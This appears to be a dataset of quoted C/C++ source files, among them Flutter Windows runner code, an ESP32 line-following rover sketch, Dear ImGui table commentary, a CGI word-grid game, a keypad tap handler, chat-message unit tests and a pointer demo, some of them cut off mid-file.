    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"progectmanaging\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\n#include <QTRSensors.h>\n#include <NewPing.h>\n#include <esp_now.h>\n#include <WiFi.h>\n\n// put function declarations here:\nvoid OnDataSent(const uint8_t *mac_addr, esp_now_send_status_t status);\nvoid OnDataRecv(const uint8_t *mac, const uint8_t *incomingData, int len);\nint calculateError(uint16_t *sensorValues);\nvoid adjustMotorSpeeds(int error);\nvoid setMotorSpeed(int pwmPin, int dirPin, int speed);\nvoid stopAllMotors();\nbool shouldStop(uint16_t *sensorValues);\nvoid rotateRight();\n\n// uint8_t broadcastAddress[] = {0x08, 0xD1, 0xF9, 0xA3, 0xED, 0x68};\nuint8_t broadcastAddress[] = {0x40, 0x91, 0x51, 0xFD, 0x54, 0xC4};\n\ntypedef struct struct_message {\n    char msg[50];\n} struct_message;\n\nstruct_message outgoingReadings;\nstruct_message incomingReadings;\nString success;\n\nbool lineLost = true;\nbool wasLineDetected = true;\nbool roverReached = false;\nbool bothRoversReady = false;\n\n// Pin assignments for motor control\nconst int motor1ULeftPWM = 25;  \nconst int motor1ULeftDir = 33; \nconst int motor2URightPWM = 18;\nconst int motor2URightDir = 19;\nconst int motor3LLeftPWM = 26;\nconst int motor3LLeftDir = 27;\nconst int motor4LRightPWM = 2;\nconst int motor4LRightDir = 4;\n\n// PWM Channels for ESP32\nconst int motor1ULeftPWMChannel = 0;\nconst int motor2URightPWMChannel = 1;\nconst int motor3LLeftPWMChannel = 2;\nconst int motor4LRightPWMChannel = 3;\n\nQTRSensors qtr;\nconst uint8_t SensorCount = 8;\nuint16_t sensorValues[SensorCount];\nint baseSpeed = 5; // Base motor speed\n\nbool roverStopped = false; // Flag to track rover status\n\nvoid OnDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {\n  Serial.print(\"\\r\\nLast Packet Send Status:\\t\");\n  Serial.println(status == ESP_NOW_SEND_SUCCESS ? \"Delivery Success\" : \"Delivery Fail\");\n  if (status == 0) {\n    success = \"Delivery Success :)\";\n  }\n  else {\n    success = \"Delivery Fail :(\";\n  }\n}\n\nvoid OnDataRecv(const uint8_t * mac, const uint8_t *incomingData, int len)\n{\n  memcpy(&incomingReadings, incomingData, sizeof(incomingReadings));\n  Serial.print(\"Bytes received: \");\n  Serial.println(len);\n  Serial.print(\"Data: \");Serial.println(incomingReadings.msg);\n\n  if ((String(incomingReadings.msg) == \"Stop\")){\n    roverReached = true;\n    strcpy(outgoingReadings.msg, \"ACK\");\n    esp_now_send(broadcastAddress, (uint8_t *)&outgoingReadings, sizeof(outgoingReadings));\n  }else if (String(incomingReadings.msg) == \"ACK\") {\n    // Set another flag to indicate that both rovers are ready to rotate\n    bothRoversReady = true;\n  }\n}\n\nvoid setup() {\n  Serial.begin(115200);\n  WiFi.mode(WIFI_STA);\n  Serial.println(WiFi.macAddress());\n  // Init ESP-NOW\n  if (esp_now_init() != ESP_OK) {\n    Serial.println(\"Error initializing ESP-NOW\");\n    return;\n  }\n\n  // Register peer\n  esp_now_peer_info_t peerInfo;\n  memset(&peerInfo, 0, sizeof(peerInfo));\n  for (int ii = 0; ii < 6; ++ii )\n  {\n    peerInfo.peer_addr[ii] = (uint8_t) broadcastAddress[ii];\n  }\n  peerInfo.channel = 0;\n  peerInfo.encrypt = false;\n\n  if (esp_now_add_peer(&peerInfo) != ESP_OK) {\n    Serial.println(\"Failed to add peer\");\n    return;\n  }\n  // Once ESPNow is successfully Init, we will register for Send CB to\n  // get the status of Trasnmitted packet\n  esp_now_register_send_cb(OnDataSent);\n  \n  // Register for a callback function that will be called when data is received\n  esp_now_register_recv_cb(OnDataRecv);\n  // Initialize sensor and motor pins\n  qtr.setTypeRC();\n  qtr.setSensorPins((const uint8_t[]){32,14,12,23,22,21,5,15}, SensorCount);\n  \n  pinMode(motor1ULeftPWM, OUTPUT);\n  pinMode(motor1ULeftDir, OUTPUT);\n  pinMode(motor2URightPWM, OUTPUT);\n  pinMode(motor2URightDir, OUTPUT);\n  pinMode(motor3LLeftPWM, OUTPUT);\n  pinMode(motor3LLeftDir, OUTPUT);\n  pinMode(motor4LRightPWM, OUTPUT);\n  pinMode(motor4LRightDir, OUTPUT);\n\n  // PWM setup for motors\n  ledcSetup(motor1ULeftPWMChannel, 5000, 8); // 5 kHz PWM, 8-bit resolution\n  ledcSetup(motor2URightPWMChannel, 5000, 8);\n  ledcSetup(motor3LLeftPWMChannel, 5000, 8);\n  ledcSetup(motor4LRightPWMChannel, 5000, 8);\n\n  ledcAttachPin(motor1ULeftPWM, motor1ULeftPWMChannel);\n  ledcAttachPin(motor2URightPWM, motor2URightPWMChannel);\n  ledcAttachPin(motor3LLeftPWM, motor3LLeftPWMChannel);\n  ledcAttachPin(motor4LRightPWM, motor4LRightPWMChannel);\n\n  // Calibration process for sensors\n  Serial.begin(115200);\n  for (int i = 0; i < 400; i++) {\n    qtr.calibrate();\n    delay(20);\n  }\n  Serial.println(\"Calibration complete\");\n}\n\nint allSensorsMaxCounter = 0; // Counter for occurrences\n\nvoid loop() {\n  uint16_t position = qtr.readLineWhite(sensorValues);\n  bool allSensorsMax = true;\n  if (shouldStop(sensorValues)) {\n    if (!roverStopped) { // Only stop the rover if it's currently moving\n      stopAllMotors();\n      wasLineDetected = false; // Update the flag\n    }\n  } else {\n    roverStopped = false; // Reset the flag when any sensor does not read 1000\n    // Proceed with error calculation and motor speed adjustment\n    int error = calculateError(sensorValues);\n    adjustMotorSpeeds(e",
    "// dear imgui, v1.90.6 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <sstream>\n#include <ctime> // For randomization\n#include <cgicc/Cgicc.h>\n#include <cgicc/HTTPHTMLHeader.h>\n#include <cgicc/FormEntry.h>\n#include <cgicc/HTTPStatusHeader.h>\n\nusing namespace cgicc;\nstd::string trim(const std::string& str) {\n    size_t start = str.find_first_not_of(\" \\t\\n\\r\");\n    size_t end = str.find_last_not_of(\" \\t\\n\\r\");\n    return (start == std::string::npos || end == std::string::npos) ? \"\" : str.substr(start, end - start + 1);\n}\n\nstd::vector<std::string> generateRandomGrid(int rows, int cols) {\n    std::vector<std::string> grid(rows);\n    std::srand(std::time(0)); // Seed for random generation\n\n    for (int i = 0; i < rows; ++i) {\n        std::string row;\n        for (int j = 0; j < cols; ++j) {\n            char randomLetter = 'A' + (std::rand() % 26); // Random letter from A-Z\n            row += randomLetter;\n        }\n        grid[i] = row;\n    }\n\n    return grid;\n}\n\nint countWordInGrid(const std::vector<std::string>& grid, const std::string& word) {\n    int count = 0;\n    std::string upperWord = word;\n    std::transform(upperWord.begin(), upperWord.end(), upperWord.begin(), ::toupper);\n\n    for (const auto& row : grid) {\n        std::string upperRow = row;\n        std::transform(upperRow.begin(), upperRow.end(), upperRow.begin(), ::toupper);\n        for (size_t i = 0; i <= upperRow.length() - upperWord.length(); i++) {\n            if (upperRow.substr(i, upperWord.length()) == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    for (size_t col = 0; col < grid[0].length(); col++) {\n        for (size_t row = 0; row <= grid.size() - upperWord.length(); row++) {\n            std::string verticalSegment;\n            for (size_t k = 0; k < upperWord.length(); k++) {\n                verticalSegment += grid[row + k][col];\n            }\n            std::transform(verticalSegment.begin(), verticalSegment.end(), verticalSegment.begin(), ::toupper);\n            if (verticalSegment == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    try {\n        Cgicc cgi;\n        std::cout << HTTPHTMLHeader() << std::endl;\n\n        std::string gridType = cgi(\"gridType\");\n        std::string searchWord = trim(cgi(\"searchWord\"));\n\n        std::vector<std::string> grid;\n\n        if (gridType == \"generate\") {\n            int rows = std::stoi(cgi(\"rows\"));\n            int cols = std::stoi(cgi(\"columns\"));\n\n            grid = generateRandomGrid(rows, cols);\n        } else {\n            const_file_iterator file = cgi.getFile(\"gridFile\");\n            if (file != cgi.getFiles().end()) {\n                std::istringstream stream((*file).getData());\n                std::string line;\n                while (std::getline(stream, line)) {\n                    if (!line.empty()) {\n                        grid.push_back(line);\n                    }\n                }\n            }\n        }\n\n        int wordCount = countWordInGrid(grid, searchWord);\n\n        std::cout << \"<html lang=\\\"en\\\">\\n\";\n        std::cout << \"<head>\\n\";\n        std::cout << \"<title>Pattern Match Game Result</title>\\n\";\n        std::cout << \"<style>\\n\";\n        std::cout << \"body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; text-align: center; }\\n\";\n        std::cout << \".container { max-width: 600px; margin: 20px auto; padding: 20px; background-color white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }\\n\";\n        std::cout << \".content { padding: 20px; text-align: center; }\\n\";\n        std::cout << \"pre { background: #f0f0f0; border: 1px solid #ddd; padding: 10px; border-radius: 5px; font-size: 1.25em; }\\n\"; \n        std::cout << \"</style>\\n\";\n        std::cout << \"</head>\\n\";\n        std::cout << \"<body>\\n\";\n        std::cout << \"<div class='container'>\\n\";\n        std::cout << \"<h1>Pattern Match Game Result</h1>\\n\";\n        std::cout << \"<div class='content'>\\n\";\n        std::cout << \"<pre>\\n\";\n        for (const auto& row : grid) {\n            std::cout << row << \"\\n\";\n        }\n        std::cout << \"</pre>\\n\";\n        std::cout << \"<p>Occurrences of the word '\" << searchWord << \"': \" << wordCount << \"</p>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</body>\\n\";\n        std::cout << \"</html>\\n\";\n    } catch (const std::exception& e) {\n        std::cout << \"Content-Type: text/plain\\n\\n\";\n        std::cout << \"Error: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n*  TapDance.cpp\n*\n*  MIT License\n*\n*  Copyright (c) 2024 Shubham Patel\n*\n*  Permission is hereby granted, free of charge, to any person obtaining a copy\n*  of this software and associated documentation files (the \"Software\"), to deal\n*  in the Software without restriction, including without limitation the rights\n*  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n*  copies of the Software, and to permit persons to whom the Software is\n*  furnished to do so, subject to the following conditions:\n*\n*  The above copyright notice and this permission notice shall be included in all\n*  copies or substantial portions of the Software.\n*\n*  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n*  SOFTWARE.\n*/\n\n#include \"TapDance.h\"\n\nTapDance::TapDance() {}\n\nvoid TapDance::keyPressed(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = true;\n  keyState->lastClickedMs = millis();\n  keyState->singleClickCounter += 1;\n}\n\nvoid TapDance::keyReleased(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = false;\n  keyState->lastClickedMs = millis();\n  if (keyState->longPressed) {\n    keyState->longPressed = false;\n  }\n}\n\nvoid TapDance::tick() {\n  if (eventHandler == NULL || keyState == nullptr) {\n    return;\n  }\n\n  for (int key = 0; key < totalKeys; key++) {\n    keyState = &keyStates[key];\n    unsigned long duration = millis() - keyState->lastClickedMs;\n\n    if (keyState->singleClickCounter > 0 && !keyState->pressed && duration >= SinglePressDuration) {\n      if (keyState->singleClickCounter == 1) eventHandler(key, SINGLE_PRESS);       // Single\n      else if (keyState->singleClickCounter == 2) eventHandler(key, DOUBLE_PRESS);  // Double\n\n      keyState->singleClickCounter = 0;\n    } else if (!keyState->longPressed && keyState->pressed && duration >= LongPressDuration) {\n      eventHandler(key, LONG_PRESS);  // Long Press\n\n      keyState->longPressed = true;\n      keyState->singleClickCounter = 0;\n    }\n  }\n}",
    "// Copyright(c) 2024 grrimgrriefer & DZnnah, see LICENSE for details.\n\n#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include \"../TalkToMeCPP/src/Voxta/DataTypes/ServerResponses/ServerResponseChatMessage.h\"\n#include \"../TalkToMeCPP/src/Voxta/DataTypes/ServerResponses/ServerResponseBase.h\"\n#include <string>\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace TalkToMeCPPTests\n{\n\tTEST_CLASS(ServerResponseChatMessageTests)\n\t{\n\tpublic:\n\t\tTEST_METHOD(TestServerResponseChatMessageGetType)\n\t\t{\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_START,\n\t\t\t\t\"msg001\", \"user001\", \"session001\");\n\n\t\t\tAssert::IsTrue(Voxta::DataTypes::ServerResponses::ServerResponseType::CHAT_MESSAGE == chatMessageResponse.GetType());\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageMessageType)\n\t\t{\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType messageType =\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_CHUNK;\n\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tmessageType, \"msg001\", \"user001\", \"session001\");\n\n\t\t\tAssert::IsTrue(messageType == chatMessageResponse.m_messageType);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageMessageId)\n\t\t{\n\t\t\tstd::string messageId = \"msg001\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_END,\n\t\t\t\tmessageId, \"user001\", \"session001\");\n\n\t\t\tAssert::AreEqual(messageId, chatMessageResponse.m_messageId);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageSenderId)\n\t\t{\n\t\t\tstd::string senderId = \"user001\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_START,\n\t\t\t\t\"msg001\", senderId, \"session001\");\n\n\t\t\tAssert::AreEqual(senderId, chatMessageResponse.m_senderId);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageSessionId)\n\t\t{\n\t\t\tstd::string sessionId = \"session001\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_CHUNK,\n\t\t\t\t\"msg001\", \"user001\", sessionId);\n\n\t\t\tAssert::AreEqual(sessionId, chatMessageResponse.m_sessionId);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageStartIndex)\n\t\t{\n\t\t\tint startIndex = 0;\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_END,\n\t\t\t\t\"msg001\", \"user001\", \"session001\", startIndex, 10, \"Hello, World!\", \"http://example.com/audio.mp3\");\n\n\t\t\tAssert::AreEqual(startIndex, chatMessageResponse.m_startIndex);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageEndIndex)\n\t\t{\n\t\t\tint endIndex = 10;\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_START,\n\t\t\t\t\"msg001\", \"user001\", \"session001\", 0, endIndex, \"Hello, World!\", \"http://example.com/audio.mp3\");\n\n\t\t\tAssert::AreEqual(endIndex, chatMessageResponse.m_endIndex);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageText)\n\t\t{\n\t\t\tstd::string messageText = \"Hello, World!\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_CHUNK,\n\t\t\t\t\"msg001\", \"user001\", \"session001\", 0, 10, messageText, \"http://example.com/audio.mp3\");\n\n\t\t\tAssert::AreEqual(messageText, chatMessageResponse.m_messageText);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseChatMessageAudioUrlPath)\n\t\t{\n\t\t\tstd::string audioUrlPath = \"http://example.com/audio.mp3\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage chatMessageResponse(\n\t\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseChatMessage::MessageType::MESSAGE_END,\n\t\t\t\t\"msg001\", \"user001\", \"session001\", 0, 10, \"Hello, World!\", audioUrlPath);\n\n\t\t\tAssert::AreEqual(audioUrlPath, chatMessageResponse.m_audioUrlPath);\n\t\t}\n\t};\n}",
    "#include<iostream>\nusing namespace std;\n\n\nint main(){\n\n    int* i1 = new int(10);\n    int* i2 = i1;\n\n    cout << \"i1: \" << &i1 << \" = \" << i1 << \" = \" << *i1 << endl;\n    cout << \"i2: \" << &i2 << \" = \" << i2 << \" = \" << *i2 << endl;\n\n    cout << endl;\n\n    // result \n            //stack    heap    \n    // i1: 0x61fefc = 0x1f1f40 = 10\n    // i2: 0x61fef8 = 0x1f1f40 = 10\n\n    *i2 = 20;\n    cout << \"i1: \" << &i1 << \" = \" << i1 << \" = \" << *i1 << endl;\n    cout << \"i2: \" << &i2 << \" = \" << i2 << \" = \" << *i2 << endl;\n\n    cout << endl;\n\n    // result\n    // i1: 0x61fefc = 0x951f40 = 10\n    // i2: 0x61fef8 = 0x951f40 = 10\n\n    // i1: 0x61fefc = 0x951f40 = 20\n    // i2: 0x61fef8 = 0x951f40 = 20\n\n    int*& i3 = i1;\n    *i3 = 100;\n    cout << \"i1: \" << &i1 << \" = \" << i1 << \" = \" << *i1 << endl;\n    cout << \"i2: \" << &i2 << \" = \" << i2 << \" = \" << *i2 << endl;\n    cout << \"i3: \" << &i3 << \" = \" << i3 << \" = \" << *i3 << endl;\n\n    //result \n//  i1: 0x61fef8 = 0x8d1f40 = 10\n//  i2: 0x61fef4 = 0x8d1f40 = 10\n\n//  i1: 0x61fef8 = 0x8d1f40 = 20\n//  i2: 0x61fef4 = 0x8d1f40 = 20\n\n//  i1: 0x61fef8 = 0x8d1f40 = 100\n//  i2: 0x61fef4 = 0x8d1f40 = 100\n//  i3: 0x61fef8 = 0x8d1f40 = 100\n\n    cout << endl;\n\n    return 0;\n}",
